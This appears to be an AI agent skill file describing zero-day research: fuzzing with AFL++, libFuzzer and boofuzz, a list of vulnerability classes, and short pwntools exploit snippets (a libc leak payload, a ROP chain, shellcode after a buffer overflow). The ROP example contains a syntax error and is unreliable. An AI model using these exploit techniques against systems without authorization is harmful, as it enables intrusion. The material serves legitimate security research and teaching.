---
name: 0day-research
description: Zero-day vulnerability research methodology, fuzzing techniques, and exploit development for authorized security research.
---

# 0-Day Research Skill

## When to Use
Use this skill for authorized vulnerability research, fuzzing, and exploit development in lab environments.

## Fuzzing Methodology

### AFL++ (American Fuzzy Lop)
```bash
# Compile for fuzzing
afl-clang-fast -fsanitize=fuzzer,address -g -o fuzz_target target.c

# Run fuzzer
afl-fuzz -i input/ -o output/ ./fuzz_target

# Monitor
afl-showmap -i output/ -o map.txt ./fuzz_target
```

### libFuzzer
```bash
# Compile
clang -fsanitize=fuzzer,address -g -o fuzz_target target.c

# Run
./fuzz_target corpus/

# Dictionary fuzzing
./fuzz_target -dict=dictionary.txt corpus/
```

### Boofuzz (Network)
```python
from boofuzz import *

session = Session(target=Target(connection=TCPSocketConnection("target", 1337)))

s_initialize("HTTP Request")
s_string("GET", name="method")
s_string(" ", name="space")
s_string("/index.html", name="path")
s_string("HTTP/1.1", name="version")
s_static("\r\n")
s_string("Host:", name="host_header")
s_string(" ", name="space2")
s_string("target.com", name="host_value")
s_static("\r\n\r\n")

session.connect(s_get("HTTP Request"))
session.fuzz()
```

## Vulnerability Classes

### Memory Corruption
- Stack buffer overflow
- Heap overflow
- Use-after-free
- Double free
- Format string

### Logic Bugs
- Race conditions
- Integer overflow
- Type confusion
- Command injection

### Cryptographic Flaws
- Weak algorithms
- Key management issues
- Padding oracle

## Exploit Development

### Information Leak
```python
# Leak libc base
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(plt_puts)
payload += p64(main_addr)
```

### ROP Chain
```python
from pwn import *

rop = ROP ELF('./binary')
rop.call('puts', [elf.got['puts']])
rop.call('main')
```

### Shellcode
```python
shellcode = asm(shellcraft.sh())
payload = b'A' * offset + p64(jmp_rsp) + shellcode
```

## Documentation
Always document:
1. Root cause analysis
2. Crash reproduction steps
3. Exploitation strategy
4. Remediation recommendation
